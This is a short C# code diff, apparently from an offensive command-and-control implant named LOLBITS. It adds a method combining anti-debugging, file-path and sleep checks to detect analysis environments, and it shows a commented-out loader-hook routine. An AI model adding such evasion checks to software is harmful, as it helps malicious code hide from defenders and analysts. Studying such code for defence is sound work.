@@ -41,6 +41,13 @@ namespace LOLBITS.Controlling
             return _p;
         }
 
+        public bool areWeSafe()
+        {
+            return Protection.Debugging.areWeSafe() &&
+                   Protection.Filepath.areWeSafe() &&
+                   Protection.Sleepy.areWeSafe();
+        }
+
        /* public void hookLdr()
         {
             _hookManager.Install();
